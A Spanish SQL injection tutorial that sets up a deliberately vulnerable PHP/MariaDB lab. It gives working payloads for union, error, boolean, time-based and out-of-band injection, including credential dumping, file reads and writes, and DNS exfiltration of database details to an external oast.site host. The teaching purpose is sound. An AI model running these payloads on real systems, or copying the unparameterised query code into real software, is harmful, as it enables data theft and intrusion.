---
title: Inyecciones SQL
author: xdann1
date: 2022-07-12
categories: [Explicación, SQLi]
tags: [SQLi, Laboratorio]
pin: true
image:
  path: ../../assets/img/commons/sqli/sqli.png
  width: 800
  height: 500
  alt: Banner SQLi
---

Si has entrado en este post es porque quieres aprender sobre las inyecciones SQL, sin embargo, siempre he creido que primero hay que aprender a andar antes de querer correr, por lo que primero aprenderemos que es SQL y para que se utiliza.

## ¿Qué es SQL?

SQL por sus siglas en inglés significa Lenguaje de Consulta Estructurada (Structured Query Language), es un lenguaje de consulta estructurada diseñado para actualizar, obtener, y calcular información en bases de datos.

---
## ¿Para qué se utiliza SQL?

La mayoría de las aplicaciones web modernas utilizan una estructura de base de datos en el back-end. Dichas bases de datos se utilizan para almacenar y recuperar datos relacionados con la aplicación web, desde el contenido web hasta la información y contenido del usuario, etc. Para que las aplicaciones web sean dinámicas, la aplicación web debe interactuar con una base de datos en tiempo real. A medida que llegan solicitudes HTTP(S) del usuario, el back-end de la aplicación web emitirá consultas a la base de datos para generar la respuesta.

---
## Inyecciones SQL

Una inyección SQL (SQLi) es una vulnerabilidad de seguridad que ocurre cuando un usuario malintencionado pasa una entrada que cambia la consulta SQL final enviada por la aplicación web a la base de datos, en otras palabras,  la inyección ocurre cuando una aplicación interpreta la entrada del usuario como código en lugar de una cadena, cambiando el flujo del código y ejecutándolo. Esto le permite al usuario realizar otras consultas no deseadas directamente en la base de datos.

Hay muchas formas de lograr esto. Para que funcione una inyección SQL, el atacante primero debe inyectar código y luego subvertir la lógica de la aplicación web cambiando la consulta original o ejecutando una completamente nueva. Entonces, el atacante tendrá que inyectar código fuera de los límites esperados de entrada del usuario, por lo que no se ejecuta como una simple entrada del usuario. En el caso más básico, esto se hace inyectando una comilla simple ( ') o una comilla doble ( ") para escapar de los límites de entrada del usuario e inyectar datos directamente en la consulta SQL.

Una vez que un atacante es capaz de inyectar código, debe buscar una forma de ejecutar una consulta SQL diferente. Esto se puede hacer usando código SQL para crear una consulta funcional que ejecute tanto la consulta SQL prevista como la nueva. Hay muchas formas de lograr esto, como usar consultas `STACKED` o consultas `UNION`. Finalmente, para recuperar el resultado de nuestra nueva consulta, debemos interpretarlo o capturarlo en el front-end de la aplicación web.

---
## Usos de inyecciones SQL

Una inyección SQL puede tener un impacto tremendo, especialmente si los privilegios en el servidor back-end y la base de datos son muy permisivos.

Primero, podemos recuperar información secreta/sensible que no debería ser visible para nosotros, como inicios de sesión y contraseñas de usuarios o información de tarjetas de crédito, que luego se pueden usar para otros fines poco éticos. Las inyecciones SQL provocan muchas filtraciones de contraseñas y datos contra sitios web, que luego se reutilizan para robar cuentas de usuarios, acceder a otros servicios o realizar otras acciones maliciosas.

Otro caso de uso de la inyección de SQL es subvertir la lógica de la aplicación web. El ejemplo más común de esto es omitir el inicio de sesión sin pasar unas credenciales válidas. Otro ejemplo es el acceso a funciones que están bloqueadas para usuarios específicos, como los paneles de administración. Los atacantes también pueden leer y escribir archivos directamente en el servidor de back-end, lo que, a su vez, puede llevar a colocar puertas traseras en el servidor back-end , consiguiendo así control directo sobre él.

---
## Tipos de inyecciones SQL

Las inyecciones SQL se clasifican según de cómo y dónde podemos leer su salida.

![Esquema Inyecciones SQL]({{ 'assets/img/commons/sqli/esquema.png' | relative_url }}){: .center-image }
_Esquema inyecciones SQL_

- In-band: la salida de la consulta es mostrada directamente en el front-end, por lo que podemos leerla directamente.
	- Union Based: utiliza la orden UNION para combinar los resultados de varias consultas SELECT, esto nos permite crear una consulta secundaria dentro de la principal
	- Error Based: utilizamos los errores PHP o SQL del front-end para que nos devuelva la salida de la consulta.
	
- Blind: no obtenemos la salida de la consulta directamente, tendremos que utilizar la lógica SQL para recuperar la salida letra por letra.
	- Boolean Based: utiliza las condicionales de SQL para controlar si la página devuelve un valor TRUE, es decir, si la letra es válida la página nos respondera , de caso contrario no lo hará.
	- Time Based: utiliza condicionales que retrasan la respuesta de la página si devuelven un valor TRUE, es decir, si la letra es válida la página tardará más de lo normal en responder.
	
- Out-of-band: en algunos casos no tendremos acceso directo a la salida de la consulta, por lo que tendremos que redirigir la salida a otro lugar, por ejemplo, a un registro DNS o peticiones HTTP(S).

---
## Creación de laboratorio para practicar inyecciones SQL

Saber la teoría está muy bien, sin embargo, esto no nos sirve de nada si no sabemos llevarlo a la práctica. Es por esto que en este apartado profundizaremos en la creación de un laboratorio que nos permita practicar los distintos tipos de inyecciones SQL. Si no quereis crear el laboratorio podéis practicarlas haciendo alguna de las máquinas de plataformas como [Hack The Box](https://www.hackthebox.com/) o [TryHackme](https://tryhackme.com/).

Para la creación de nuestro laboratorio de pruebas utilizaremos el software MariaDB y Apache. Lo primero que tendremos que hacer es iniciar ambos servicios, podéis ver como hacerlo desde [aqui](https://geekland.eu/systemctl-administrar-servicios-linux/).

Cuando ya tengamos iniciados ambos servicios vamos a proceder a crear la estructura de la base de datos que vamos a utilizar, os dejo un [post](https://mariadb.com/kb/es/basic-sql-statements/) en el que explican como hacerlo. Así nos quedarían las dos tablas con sus respectivos datos.

```plaintext
Base de datos Tienda

Tabla de Usuarios
+------+----------+--------------+---------------+
| id   | nombre   | contraseña   | rol           |
+------+----------+--------------+---------------+
|    1 | admin    | admin123     | administrador |
|    2 | usuario1 | usuario1_123 | usuario       |
|    3 | usuario2 | usuario2_123 | usuario       |
|    4 | usuario3 | usuario3_123 | usuario       |
|    5 | vendedor | vendedor123  | vendedor      |
+------+----------+--------------+---------------+

Tabla de Productos
+------+---------+---------------------------------------------------+
| id   | nombre  | descripcion                                       |
+------+---------+---------------------------------------------------+
|    1 | teclado | lo puedes usar para escribir                      |
|    2 | raton   | lo usas para interactuar con la interfaz grafica  |
|    3 | monitor | puedes ver cosas en el                            |
|    4 | silla   | te sientas en ella                                |
|    5 | cascos  | puedes escuchar cosas con el                      |
+------+---------+---------------------------------------------------+
```

Vamos a usar el siguiente código para conectar la base de datos a una aplicación web (necesitais un usuario que tenga los privilegios necesarios, os dejo un [post](https://techexpert.tips/es/mariadb-es/mariadb-crear-una-cuenta-de-superusuario/) que explica como hacerlo).

```php
<?php

// Datos
$dbhostname = 'localhost';
$dbuser = 'usuario';
$dbpassword = 'contraseña';
$dbname = 'nombreBasedeDatos';

//Creamos la conexion
$connection = mysqli_connect($dbhostname, $dbuser, $dbpassword, $dbname);

//Comprobamos si se ha hecho bien la conexion
if (!$connection) {
    echo mysqli_error($connection);
    die();
}

// Parametro con el cual recogemos el input
$input= $_GET['nombre'];

// Definimos consulta a Mariadb
$query = "SELECT id, nombre, descripcion FROM Productos WHERE nombre='$input'";

// Lanzamos la consulta
$results = mysqli_query($connection, $query);

// Comprobamos si se ha hecho bien la consulta
if (!$results) {
    echo mysqli_error($connection);
    die();
}

// Obtenemos y mostramos ls resultados de la consulta. Los resultados se almacenan en un array por el cual iteramos
while ($rows = mysqli_fetch_assoc($results)) {
	echo "<table>";
	echo "<tr>";
	echo "  <th align='left'> ID </th>";
	echo "  <th align='left'> Producto </th>";
	echo "  <th align='left'> Descripcion </th>";
	echo "</tr>";
	echo "<tr>";
	echo "<td align='left'> " . $rows['id'] . "</td>";
	echo "<td align='left'> " . $rows['nombre'] . "</td>";
	echo "<td align='left'> " . $rows['descripcion'] . "</td>";
	echo "</tr>";
	echo "</table>";
}

?>
```

---
## Explotación de las inyecciones SQL 

En este apartado pretendo explicar la explotación de todos los tipos de inyecciones SQL, realmente todas se basan en los mismos principios y objetivos por lo que me extenderé más en la explicación del primer tipo (Union Based), ya que los conceptos de sacar información y explotación de privilegios los podemos extrapolar a los demás tipos de inyecciones.

Tenéis a vuestra disposición varias herramientas que automatizan la explotación de las inyecciones SQL, sin embargo, yo recomiendo que aprendáis a explotarlas por vostros mismos ya que no siempre vais a tener estas herramientas a mano, además siempre está bien aprender nuevas cosas.

<h3 data-toc-skip>Union Based</h3> 

Antes de comenzar a explotar la inyección tendremos que comprobar si realmente estamos ante una posible inyección SQL de este tipo, esto lo podemos hacer inyectando código en la consulta. Podemo ver si estamos ante una inyección SQL de este tipo con el siguiente payload `1' UNION SELECT 1-- -`. Con esta consulta pueden pasar 3 cosas:

* Que añada el dato de la segunda consulta SELECT sin dar errores
* Que nos salte el siguiente error: `The used SELECT statements have a different number of columns`
* Que no ocurra nada

Si nos ocurre cualquiera de los dos primeros casos significará que estamos ante una inyección SQL ya que hemos sido capaces de unir las salidas de dos consultas SELECT utilizando una consulta UNION.

A priori parece que solo podemos introducir datos dentro del campo del nombre, sin embargo, como hemos visto antes podemos añadir una comilla a la consulta para cerrar el campo, por lo que todo lo que escribamos luego de la comilla quedará fuera de él.

Por ejemplo, si hacemos esto vamos a ser capaces de inyectar código fuera de los limites del campo, introduzcamos en la consulta el siguiente payload `1' UNION SELECT 1, 2, 3-- -`.

![Inyección de código]({{ 'assets/img/commons/sqli/inyeccion_codigo.png' | relative_url }}){: .center-image }
_Conseguimos inyectar código SQL_

Vemos que hemos sido capaces de inyectar código fuera de los limites del campo del nombre, ahora pasaremos a explicar como combinar los resultados de varias consultas SELECT utilizando la orden UNION.

Para que podamos hacer esto es necesario que ambas consultas SELECT tengan el mismo número de columnas y que almacenen el mismo tipo datos. Cuando queramos poner en practica este tipo de inyección SQL descubriremos que la consulta original no tendrá misma cantidad de columnas que nuestra consulta, por lo que tendremos que arreglarlo. 

Supongamos que la consulta original tiene 3 columnas y la nuestra solamente tiene 2, por lo que tendremos que conseguir de alguna manera que nuestra consulta tenga 3 columnas. Aquí es donde entran los datos basura, los datos basura son aquellos que utilizamos para conseguir tener el mismo número de columnas en ambas consultas SELECT.

Vamos a hacer una consulta SELECT con 2 columnas que uniremos a la otra consulta SELECT mediante la orden UNION. Nuestro payload sería el siguiente `1' UNION SELECT nombre, contraseña FROM Usuarios-- -`.

![Error en consulta UNION]({{ 'assets/img/commons/sqli/error_union.png' | relative_url }}){: .center-image }
_Error debido a que las consultas SELECT no tienen el mismo número de columnas_

Vemos que nos da un error debido a que no tenemos el mismo número de columnas en las dos consultas SELECT (3 columnas y 2 respectivamente), ya que necesitamos de una columna en nuestra consulta para igualar a la original vamos a utilizar los datos basura para añadir una columna más, quedando nuestro payload así `1' UNION SELECT nombre, contraseña, 3 FROM Usuarios-- -`

![Datos basura]({{ 'assets/img/commons/sqli/dato_basura.png' | relative_url }}){: .center-image }
_Utilizamos los datos basura para conseguir el mismo número de columnas_

Ya sabemos que necesitamos tener las mismas columnas en las dos consultas SELECT para crear una consulta dentro de la principal con la orden UNION, en el ejemplo anterior nosotros ya sabiamos cuantas columnas necesitabamos, sin embargo, cuando queramos poner en práctica esto en otros entornos controlados no vamos a saber cuantas columnas vamos a necesitar, aquí entra en juego la orden ORDER BY.

La orden ORDER BY nos sirve para realizar un ordenamiento de los datos, nosotros como atacantes nos podemos aprovechar de esto pidiendole que nos ordene los datos a partir de ciertas columnas, por lo que si le pedimos que nos ordene por la quinta columna cuando la tabla solo tiene 4 columnas nos saltará un error. De esta forma vamos probando hasta encontrar un número con el cual no provocamos un error y que el siguiente si lo provoque.

Vamos a descubrir cuantas columnas tiene la tabla Productos utilizando la orden ORDER BY, probemos primero con 4 columnas, quedando nuestro payload así `1' ORDER BY 4-- -`

![Error en la consulta]({{ 'assets/img/commons/sqli/order_by.png' | relative_url }}){: .center-image }
_Error debido a que la tabla no tiene ese número de columnas_

Vemos que nos da un error por lo que el número de columnas tiene que ser menor que 4, probemos ahora con 3 columnas.

![Encontramos el número correcto]({{ 'assets/img/commons/sqli/order_by2.png' | relative_url }}){: .center-image }
_Encontramos el número de columnas que tiene la tabla_

Ahora no nos saltará un error por lo que ya sabemos que la tabla tiene 3 columnas ya que el número siguiente nos da error y este no. Ya sabiendo la cantidad de columnas que tiene la tabla vamos a empezar a recopilar información básica sobre la base de datos antes de empezar con la explotación.

| Información a obtener         | Software       | Consulta                      |
|:-------------------------------|:---------------|------------------------------:|
| Nombre de la base de datos     | Todos          | database()                    |
| Versión de la base de datos   | MySQL          | @@version                     |
|                                | Oracle         | v$verrsion                    |
|                                | PostgreSQL     | version()                     |
| Usuario que la está corriendo | Todos          | user()                        |

Como solo necesitamos 3 columnas vamos a introducir 3 consultas para conseguir información, así que no vamos a utilizar datos basura para conseguir más columnas. Vamos a mandar el siguiente payload `1' UNION SELECT database(), @@version, user()-- -`.

![Información Básica]({{ 'assets/img/commons/sqli/informacion_basica.png' | relative_url }}){: .center-image }
_Recopilación de información Básica_

Ya hemos recopilado información que nos puede ser útil, ahora voy a pasar a explicar la explotación de la inyecciones SQL de tipo Union Based.

Lo primero de todo, necesitaremos saber que bases de datos existen. Esto lo podemos averiguar consultando la columna llamada `schema_name` de la tabla `schemata` de la base de datos `information_schema`. Nuestro payload quedaría así `1' UNION SELECT schema_name, 2, 3 FROM information_schema.schemata-- -`

![Bases de datos existentes]({{ 'assets/img/commons/sqli/basededatos_union.png' | relative_url }}){: .center-image }
_Bases de datos existentes_

Las tres primeras bases de datos no nos interesan ahora mismo, veamos que tablas contiene la base de datos llamada `Tienda`. Nuestro payload para sacar las tablas quedaría así `1' UNION SELECT table_name, 2, 3 FROM information_schema.tables WHERE table_schema="Tienda"-- -`.

![Tablas existentes]({{ 'assets/img/commons/sqli/tablas_union.png' | relative_url }}){: .center-image }
_Tablas existentes_

Vamos a sacar las columnas existentes en la tabla de `Usuarios` con el siguiente payload `1' UNION SELECT column_name FROM information_schema.columns WHERE table_schema="Tienda" AND table_name="Usuarios"-- -`

![Columnas existentes]({{ 'assets/img/commons/sqli/columnas_union.png' | relative_url }}){: .center-image }
_Columnas existentes_

Ya sabemos que columnas tiene la tabla de `Usuarios`, por lo que vamos a proceder a sacar toda la información. Sin embargo, vemos que tenemos que sacar 4 columnas pero la consulta original solo tiene 3 por lo que vamos a tener que recurrir a una concatenación con la orden `concat`, quedando así nuestro payload `1' UNION SELECT CONCAT(id,0x3a,nombre,0x3a,contraseña,0x3a,rol), 2, 3 FROM Tienda.Usuarios-- -` (0x3a es igual a ":" en hexadecimal).

![Datos existentes]({{ 'assets/img/commons/sqli/datos_union.png' | relative_url }}){: .center-image }
_Datos existentes_

Ya tenemos las credenciales de los usuarios, parecería que ya no podemos hacer mucho más con la base de datos, pero esto no es así ya que por ejemplo, podemos intentar ver si el usuario que está corriendo la base de datos tiene permisos de lectura/escritura, si fuera así podríamos leer archivos del servidor e incluso dejar una puerta trasera que nos de acceso directo al servidor.

Para poder leer archivos del servidor necesitaremos que nuestro usuario tenga el privilegio `FILE` asignado. Podemos ver si tenemos ese privilegio asignado con el siguiente payload `1' UNION SELECT grantee, privilege_type, 3 FROM information_schema.user_privileges WHERE privilege_type="FILE"-- -`.

![Privilegios de nuestro usuario]({{ 'assets/img/commons/sqli/privilegios_union.png' | relative_url }}){: .center-image }
_Privilegios de nuestro usuario_

Vemos que el usuario que está corriendo la base de datos es el mismo que tiene el privilegio `FILE`, por lo que vamos a ser capaces de leer archivos. Lo haremos utilizando la orden `LOAD_FILE`, esta orden toma como argumento el archivo que queramos leer, vamos a intentar leer el `/etc/passwd` con el siguiente payload `1' UNION SELECT LOAD_FILE("/etc/passwd"), 2, 3-- -`.

![Lectura de archivos]({{ 'assets/img/commons/sqli/lectura_archivos.png' | relative_url }}){: .center-image }
_Lectura de archivos_

Ya hemos conseguido leer archivos del servidor ahora vamos a ver que necesitamos para escribirlos. Para poder escribir archivos del lador del servidor necesitamos tres cosas:

1. Usuario con privilegio `FILE` habilitado
2. Variable `secure_file_priv` no habilitada
3. Acceso de escritura en la ubicación en la que queramos escribir.

Al revisar si somos capaces de leer archivos en el servidor hemos consultado si nuestro usuario tenía asignado el privilegio `FILE`, por lo que no es necesario que lo volvamos a consultar.

Ya sabemos que contamos con los privilegios necesarios, ahora vamos a ver si la variable `secure_file_priv` está activada. Esta variable se utiliza para determinar desde donde podemos leer/escribir archivos. Un valor vacío en esta variable nos indica que podemos leer/escribir en todo el sistema de archivos. Vamos a revisar su valor con el siguiente payload `1' UNION SELECT variable_name, variable_value, 3 FROM information_schema.global_variables WHERE variable_name="secure_file_priv"-- -`.

![Valor de la variable]({{ 'assets/img/commons/sqli/privilegios2_union.png' | relative_url }}){: .center-image }
_Valor de la variable_

Vemos que la variable `SECURE_FILE_PRIV` no tiene ningún valor asignado por lo que podremos leer/escribir desde cualquier parte del sistema de archivos siempre que tengamos los permisos necesarios para leerlos/crearlos, esto lo haremos con la orden `INTO OUTFILE` quedando así nuestro payload `1' UNION SELECT "Esto es una prueba", "", "" INTO OUTFILE "/tmp/prueba.txt"-- -`.

```plaintext
❯ cat /tmp/prueba.txt
Esto es una prueba
```

Ya hemos conseguido crear y escribir archivos del lado del servidor, yo en este caso he escrito un texto cualquiera para la demostración pero podemos llegar a poner puertas traseras que nos den acceso al servidor.

<h3 data-toc-skip>Error Based</h3>

Las inyecciones SQL de tipo Error Based consisten en provocar a propósito un error en la consulta para conseguir de esta forma listar datos desde la salida del propio error.

Lo primero que haremos será comprobar si realmente estamos ante una inyección SQL de tipo Error Based, esto lo podemos hacer inyectando algún payload en la consulta para ver si conseguimos producir un error. 

| Payload                       | Codificado URL |
|:------------------------------|---------------:|
| '                             | %27            |
| "                             | %22            |
| #                             | %23            |
| ;                             | %3B            |
| (                             | %28            |
| )                             | %29            |

![Error de la consulta]({{ 'assets/img/commons/sqli/error_consulta.png' | relative_url }}){: .center-image }
_Detectamos que estamos ante una inyección SQL de tipo Error Based_

Tenemos a nuestra disposición una gran cantidad de formas para producir errores, sin embargo, no todas las formas sirven para las mismas situaciones. Sabiendo esto, necesitaremos conseguir información sobre la base de datos utilizada, para de esta forma utilizar el payload correcto que causara el error que necesitamos.

Si nos fijamos bien en el mensaje de error que hemos recibido antes nos encontremos que el error nos está proporcionando información acerca de la base de datos.

* Información acerca del gestor de bases de datos utilizado: Mariadb
* Que causó el error: comilla simple (')
* En que parte de la consulta ocurrió el error: (teclado')

Ya sabemos que se está utilizando Mariadb como gestor de bases de datos, por lo que podemos reducir los payloads a utilzar. Como se está utilizando Mariadb vamos a utiliazar el siguiente payload adaptado para Mariadb: `1' AND EXTRACTVALUE('',CONCAT('=',database()))-- -`

Este payload convierte una cadena (resultado de database()) en un número entero, lo que generará un error que contendrá el contenido de la cadena a convertir. Utilizamos la función CONCAT para añadir al principio de la cadena el signo igual. En caso de que los primeros caracteres de la cadena sean válidos para convertirlos (números enteros) la cadena no se mostrara en el error, el añadir el signo igual evita esto.

![Conseguimos saber el nombre de la base de datos actual]({{ 'assets/img/commons/sqli/basedatos_errorbased.png' | relative_url }}){: .center-image }
_Conseguimos saber el nombre de la base de datos actual_

Como veis hemos sido capaces de averiguar el nombre de la base de datos actual a través de la salida del error. Ahora vamos a intentar saber las tablas existentes, lo haremos con el siguiente payload `1' AND EXTRACTVALUE('',CONCAT('=',(SELECT table_name FROM information_schema.tables WHERE table_schema="Tienda" LIMIT 0,1)))-- -`. Recalco que en este tipo de inyección SQL solamente podemos conseguir una columna por consulta SELECT, aun así como estamos usando la función CONCAT podemos añadir más consultas SELECT.

![Conseguimos saber el nombre de una de las tablas]({{ 'assets/img/commons/sqli/tablas_errorbased.png' | relative_url }}){: .center-image }
_Conseguimos saber el nombre de una de las tablas_

Ya si queremos saber el nombre de las columnas y los datos que contienen estas tendremos que hacerlo como en las de tipo `UNION BASED`, con la única diferencia de que no son necesarios los datos basura ni la orden UNION y que necesitamos el uso de la orden `LIMIT`.

<h3 data-toc-skip>Boolean Based</h3>

Antes de explicar nada, vamos a necesitar realizar unas modificaciones al codigo de nuestra aplicación web. Los cambios consistiran en comentar el código con el que mostramos los resultados de la consulta, además, añadiremos una línea que nos diga cuando la consulta se ha realizado de una forma correcta:

```php
// Obtenemos y mostramos ls resultados de la consulta. Los resultados se almacenan en un array por el cual iteramos
while ($rows = mysqli_fetch_assoc($results)) {
//	echo "<table>";
//	echo "<tr>";
//	echo "  <th align='left'> ID </th>";
//	echo "  <th align='left'> Producto </th>";
//	echo "  <th align='left'> Descripcion </th>";
//	echo "</tr>";
//	echo "<tr>";
//	echo "<td align='left'> " . $rows['id'] . "</td>";
//	echo "<td align='left'> " . $rows['nombre'] . "</td>";
//	echo "<td align='left'> " . $rows['descripcion'] . "</td>";
//	echo "</tr>";
//	echo "</table>";
	echo "La consulta se ha realizado correctamente";
}
```

Como he explicado en el apartado de tipos de inyecciones SQL, las inyecciones de tipo Boolean Based utilizan los condicionales para modificar la respuesta del servidor de esta forma consiguiendo saber si un dato es correcto o no.

Lo primero que necesitaremos es comprobar si realmente estamos ante una inyección SQL de este tipo, esto lo podemos hacer inyectando código en la consulta. Lo que haremos será inyectar un operador lógico `AND` seguido de una expresión que nunca sea cierta, como por ejemplo 1=2. Veremos que no nos da respuesta el servidor, si es así probaremos con una expresión que siempre sea cierta como por ejemplo 1=1. Si nos da respuesta el servidor significará que estamos ante una inyección SQL de tipo Boolean Based. 

Cabe recalcar que necesitamos que la primera expresión del AND devuelva TRUE, es decir, que el dato de la primera expresión se encuentre en la base de datos. Si no conocemos algún dato que este en la base de datos podemos utilizar un `OR` aunque recomiendo utilizar mejor el `AND`.

![No nos responde la p  gina]({{ 'assets/img/commons/sqli/descubrir_boolean2.png' | relative_url }}){: .center-image }
_No nos respondela p  gina_

![Nos responde la página]({{ 'assets/img/commons/sqli/descubrir_boolean.png' | relative_url }}){: .center-image }
_Nos responde la página_

Ya sabiendo que estamos ante una inyección SQL de tipo Boolean Based voy a explicar la explotación de esta. Para el ejemplo vamos a utilizar el siguiente payload `teclado' AND SUBSTR(database(),1,1)="t"-- -`

Con este payload estamos comparando la primera letra de la base de datos actual (Tienda) con la letra "t" (es Case Insensitive), si esta comparación nos devuelve un valor `TRUE` nos contestará de una forma normal, de no ser así asi el servidor no nos contestara. Basandonos en esto ya vamos a saber si la letra es válida según si nos responde o no.

Ya tenemos la primera letra del nombre de la base de datos actual, ahora tendremos que conseguir la segunda, para ello utilizaremos el siguiente payload `teclado' AND SUBSTR(database(),2,1)="t"-- -`, daos cuenta que he variado el número que hace referenca a la letra que se quiere evaluar en este caso ahora vamos a evaluar la segunda letra de la base de datos (i).

Tras muchas consultas encontraremos que el nombre de la base de datos es "Tienda", si queremos conseguir otros datos lo que tendremos que hacer es cambiar el valor de la string de la que vamos a sacar la letra. Por ejemplo, ahora vamos a sacar una tabla de la base de datos actual, esto lo haríamos con el siguiente payload `teclado' AND SUBSTR((SELECT table_name FROM information_schema.tables WHERE table_schema="Tienda" LIMIT 0,1),1,1)="p"-- -`.

Si nos fijamos, la string que vamos a comparar con las letras y que conseguimos a través de la consulta SELECT es muy parecida a las que hacíamos con las de tipo `UNION BASED`, con la diferencia de que en estas no vamos a necesitar utilizar los datos basura ni la orden UNION y de que en estas necesitamos utilizar la orden LIMIT.

De nuevo, tras muchas consultas encontraremos que la el nombre de la primera tabla es Productos, si queremos conseguir el nombre de la otra simplemente variaremos la variable que limita los resultados de la función LIMIT, vamos a conseguir el nombre de la otra tabla con el siguiente payload `teclado' AND SUBSTR((SELECT table_name FROM information_schema.tables WHERE table_schema="Tienda" LIMIT 1,1),1,1)="u"-- -`.

Ya si queremos conseguir el nombre de las columnas y los valores que almacenan estas es exactamente igual que en las de tipo `UNION BASED`, con la diferencia de los datos basura, la orden UNION y la orden LIMIT.

Quiero recalcar que podemos variar la forma del payload, en nuestro ejemplo vamos comparando letra por letra pero podemos hacerlo de otras maneras, como por ejemplo probando palabras enteras. Si queremos hacerlo utilizando palabras directamente podemos hacerlo con el siguiente payload `teclado' AND database()="Tienda"-- -`. En ambos métodos recomiendo que os hagáis un script para agilizar el proceso pues se os puede llegar a hacer pesado si lo hacéis manualmente.

<h3 data-toc-skip>Time Based</h3>

Como en las inyecciones SQL de tipo Boolean Based necesitamos hacer un cambio en el código, en este caso simplemente tendremos que comentar la línea que nos indica que la consulta se ha realizado correctamente.

```php
// Obtenemos y mostramos ls resultados de la consulta. Los resultados se almacenan en un array por el cual iteramos
while ($rows = mysqli_fetch_assoc($results)) {
//	echo "<table>";
//	echo "<tr>";
//	echo "  <th align='left'> ID </th>";
//	echo "  <th align='left'> Producto </th>";
//	echo "  <th align='left'> Descripcion </th>";
//	echo "</tr>";
//	echo "<tr>";
//	echo "<td align='left'> " . $rows['id'] . "</td>";
//	echo "<td align='left'> " . $rows['nombre'] . "</td>";
//	echo "<td align='left'> " . $rows['descripcion'] . "</td>";
//	echo "</tr>";
//	echo "</table>";
//	echo "La consulta se ha realizado correctamente";
}

```

Las inyecciones SQL de tipo Time Based son muy parecidas a las de tipo Boolean Based, la única diferencia entre ellas radica en la forma en la que conseguimos detectar si nuestro payload es correcto. Para detectar si nuestro payload es correcto o no utilizaremos condicionales que retrasaran la respuesta del servidor.

Lo primero que necesitaremos es comprobar si realmente estamos ante una inyección SQL de este tipo, esto lo podemos hacer inyectando código en la consulta, quedando nuestro payload así `teclado' and sleep(5)-- -`. Cabe recalcar que como en las de tipo `Boolean Based` necesitamos que la primera expresión de `AND` devuelva un valor `TRUE`.

Si el servidor espera 5 segundos antes de darnos una respuesta es que nos encontramos ante una inyección SQL de tipo Time Based, a continuación voy explicar la explotación de esta. Para el ejemplo vamos a utiliar el siguiente payload `teclado' AND IF(SUBSTR(database(),1,1)="t", sleep(5),1)-- -`.

Con este payload estamos comparando la primera letra de la base de datos actual (Tienda) con la letra "t" (es Case Insensitive), si esta comparación nos devuelve un valor `TRUE` esperará 5 segundos, de no ser así no esperará. Con este payload el servidor esperará 5 segundos por que la letra "t" es la primera de la base de datos actual, si esta no fuera la primera letra tendremos que ir cambiando continuamente la letra hasta encontrar la que hace que el servidor retrase su respuesta. Ya tenemos la primera letra de la base de datos actual, ahora tendremos que conseguir la segunda, para ello utilizaremos el siguiente payload `teclado' AND IF(SUBSTR(database(),2,1)="i", sleep(5),1)-- -`, notese que he variado el número que hace referencia a la letra que se quiere evaluar en este caso ahora vamos a evaluar la segunda letra de la base de datos (i).

Tras muchas consultas encontraremos que el nombre de la base de datos actual es "Tienda", si queremos conseguir otros datos lo que tendremos que hacer es cambiar el valor de la string de la que vamos a sacar la letra. Por ejemplo, ahora vamos a sacar una tabla de la base de datos actual, esto lo haríamos con el siguiente payload `teclado' AND IF(SUBSTR((SELECT table_name FROM information_schema.tables WHERE table_schema="Tienda" LIMIT 0,1),1,1)="p",sleep(5),1)-- -`. Si nos fijamos, la string que vamos a comparar con las letras y que conseguimos a través de la consulta SELECT es muy parecida a las que hacíamos con las de tipo `UNION BASED`, con la diferencia de que en estas no vamos a necesitar utilizar los datos basura ni la orden UNION y que vamos a necesitar utilizar la orden LIMIT.

De nuevo, tras muchas consultas encontraremos que la el nombre de la primera tabla es `Productos`, si queremos conseguir el nombre de la otra simplemente variaremos la variable que limita los resultados de la función LIMIT, vamos a conseguir el nombre de la otra tabla con el siguiente payload `teclado' AND IF(SUBSTR((SELECT table_name FROM information_schema.tables WHERE table_schema="Tienda" LIMIT 1,1),1,1)="u",sleep(5),1)-- -`.

Ya si queremos conseguir el nombre de las columnas y los valores que almacenan estas es exactamente igual que en las de tipo `UNION BASED`, con la diferencia de los datos basura y la orden `LIMIT`.

Quiero recalcar que podemos variar la forma del payload, en nuestro ejemplo vamos comparando letra por letra pero podemos hacerlo de otras maneras, como por ejemplo probando palabras enteras. Si queremos hacerlo utilizando palabras directamente podemos hacerlo con el siguiente payload `teclado' and if(database()="Tienda", sleep(5),1)-- -`. En ambos métodos recomiendo que os hagáis un script para agilizar el proceso pues se os puede llegar a hacer pesado si lo hacéis manualmente.

<h3 data-toc-skip>Out-of-band</h3>

Este tipo de inyecciones se dan cuando no somos capaces de conseguir la salida de la consulta de ninguna forma posible y además tenemos la capacidad de generar peticiones HTTP(S) o DNS. 

Para explotar este tipo de inyecciones SQL necesitaremos no tener la variable `secure_file_priv` habilitada, para consultar su valor tendremos que utilizar una consulta explotando este tipo de inyección, por lo que no será necesario consultar su valor ya que si somo capaces de hacerlo es por que no está habilitada.

Para explotar este tipo de inyección SQL necesitaremos una herramienta que utilizaremos para interceptar la información que mandamos a través de consultas HTTP(S) o DNS, yo voy a utilizar la herramienta `interactsh`, os dejo su [repositorio de github](https://github.com/projectdiscovery/interactsh) y un [video para aprender a usarla](https://www.youtube.com/watch?v=p-N56aR4Omw).

Iniciaremos la herramienta, al iniciarla nos proporcianaran un dominio al que tendremos que enviar las peticiones DNS o HTTP(S). Vamos a sacar la versión de la base de datos, el usuario que está corriendo la base de datos y la base de datos en uso. Os dejo un [estudio](https://zenodo.org/record/3556347#.YtGJj3ZByUm) en el que explotan este tipo de inyección SQL según la base de datos utilizada, en nuestro caso, utilizaremos el siguiente payload `teclado' UNION SELECT 1, 2, LOAD_FILE(CONCAT('\\\\',(SELECT @@version),'.',(SELECT user()),'.', (SELECT database()),'.','cb69n4j0744r7nrac3k0p8anqgpwzkhsc.oast.site\\vfw'))-- -` (teneis que cambiar el dominio por el que os hayan proporcionado).

```plaintext
[10.5.12-MariaDB-0+deb11u1.xdann1.Tienda.cb69n4j0744r7nrac3k0p8anqgpwzkhsc] Received DNS interaction (AAAA) from 85.62.233.105 at 2022-07-11 22:16:09
```

De esta forma hemos conseguido enviar una solicitud DNS a un dominio el cual tiene de subdominios la salida de las consultas SELECT. Si queremos conseguir otros datos
simplemente tendremos que cambiar las consultas SELECT.

<h3 data-toc-skip>Paneles de Login</h3>

Soy consciente de que esto no es un tipo de inyección SQL pero creo que se merece un apartado para explicar distintas formas de explotarlos.

